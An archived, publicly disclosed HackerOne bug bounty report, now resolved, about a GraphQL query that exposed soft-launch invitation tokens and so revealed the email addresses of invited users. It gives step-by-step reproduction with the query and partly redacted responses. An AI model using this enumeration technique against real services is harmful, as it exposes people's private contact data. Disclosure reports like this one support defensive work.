---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/information-disclosure
  - env/web
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2020-05-15
submitted: 2020-02-28T23:15:43.015Z
bounty_usd: 7500
votes: 590
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "haxta4ok00"
source: "https://hackerone.com/reports/807448"
title: "Customer private program can disclose email any users through invited via username"
---
# Customer private program can disclose email any users through invited via username

> **Severity:** High | **Bounty:** 7,500 USD | **Votes:** 590 | **Program:** HackerOne | **Disclosed:** 2020-05-15

- Report: [https://hackerone.com/reports/807448](https://hackerone.com/reports/807448)
- CWE: Information Disclosure
- Submitted: 2020-02-28T23:15:43.015Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hey team,This bug could have been used by my calculations a long time ago
## Steps To Reproduce:
1)Go to https://hackerone.com/hackerone_h1p_bbp3/launch
2)Take invite via username
3)Input username , send invite
3.1)When an invite is created, we get a token
4)Now Go use GraphQL query

https://hackerone.com/graphql?

`{"query": "query {team(handle:\\"hackerone_h1p_bbp3\\"){_id,handle,soft_launch_invitations{total_count,nodes{... on InvitationsSoftLaunch{token}}}}}"}`

Answer:

`{"data":{"team":{"_id":"47388","handle":"hackerone_h1p_bbp3","soft_launch_invitations":{"total_count":5,"nodes":[{"token":"████████"},{"token":"███"},{"token":"████"},{"token":"██████"},{"token":"████████"}]}}}}`
████


5)Now check .json - █████████

`{"token":"████████","type":"Invitations::SoftLaunch","auth_option":"has-no-access","email":"████@managed.hackerone.com","status":"valid","expires_at":"2020-03-06T21:33:31.689Z","recipient":{"username":"zebra","profile_picture":"███","url":"https://hackerone.com/zebra"},"open_soft_launch_invitations_count":0}`


`"email":"██████████@managed.hackerone.com"`
██████
6)You need to do this immediately before the user accepts or rejects our request for an invite

Thanks, @haxta4ok00

## Impact

Disclosed email

## Timeline

- **Report Filed**
- **External User Joined**
- **External User Joined**
- **Report Triaged**
- **2020-03-03** @8thwonder: @haxta4ok00 Please add a proposed CVSS score to this report.
- **Report Needs More Info**
- **Report Severity Updated**
- **Report Triaged**
- **Report Vulnerability Types Updated**
- **Report Resolved**
- **User Completed Retest**
- **Report Severity Updated**
- **Reassigned To Team**
- **External User Removed**
- **External User Removed**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Report Collaborator Joined**
- **Bounty Awarded**
- **Bounty Awarded**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
